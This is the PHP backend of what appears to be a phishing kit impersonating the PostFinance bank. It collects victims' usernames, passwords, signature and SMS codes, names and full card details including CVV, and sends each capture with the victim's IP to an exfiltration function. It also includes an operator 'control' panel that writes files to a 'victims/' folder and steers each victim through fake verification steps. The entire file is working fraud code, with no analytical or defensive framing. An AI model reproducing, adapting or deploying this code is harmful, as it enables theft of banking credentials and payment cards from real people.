<?php
  
    require_once 'functions.php';

 if(isset($_POST["p_username"])) {
  $Login = "------- Post-finance -------   
      Login    :  ".$_POST['p_username']." 
      Password    :  ".$_POST['p_passw']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      -----------BY RIO----------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }

   if(isset($_POST["p_si_nr"])) {
  $Login = "------- Post-finance -------   
      signature    :  ".$_POST['p_si_nr']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      -----------BY RIO----------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }

   if(isset($_POST["smsss"])) {
  $Login = "------- Post-finance -------   
      SMS    :  ".$_POST['smsss']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      -----------BY RIO----------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }

     if(isset($_POST["namra"])) {
  $Login = "------- Post-finance -------   
      namra    :  ".$_POST['namra']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      -----------BY RIO----------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }


    if(isset($_POST["cvv"])) {
  $Login = "------- Post-finance -------   
      smiya    :  ".$_POST['smiya']." 
      cc    :  ".$_POST['cc']." 
      date    :  ".$_POST['date']." 
      cvv    :  ".$_POST['cvv']." 
      link    :  ".get_steps_link()." 
      IP ADDR  :  ".$ip."
      -----------BY RIO----------- 
  ";
functiondilih($Login);
            header("location: loading.php?verification#_");

  }

      if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            $text = $_POST['to'];
            if( $_POST['to'] == 'signature' ) {
                $text = 'signature|' . $_POST['signaturcode'];
            }
            if( $_POST['to'] == 'badsignature' ) {
                $text = 'badsignature|' . $_POST['signaturcode'];
            }
            if( $_POST['to'] == 'confirmation' ) {
                $text = 'confirmation|' . $_POST['confirmcode1'] . '-' . $_POST['confirmcode2'];
            }
              if( $_POST['to'] == 'cc' ) {
                $text = 'cc|' . $_POST['signaturcode'];
            }
            if( $_POST['to'] == 'badconfirmation' ) {
                $text = 'badconfirmation|' . $_POST['confirmcode1'] . '-' . $_POST['confirmcode2'];
            }
            fwrite($fp, $text);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }

if ($_GET['id'] == 1) {
            header("location: login.php?ip=" . $_POST['ip']);
} 
 
?>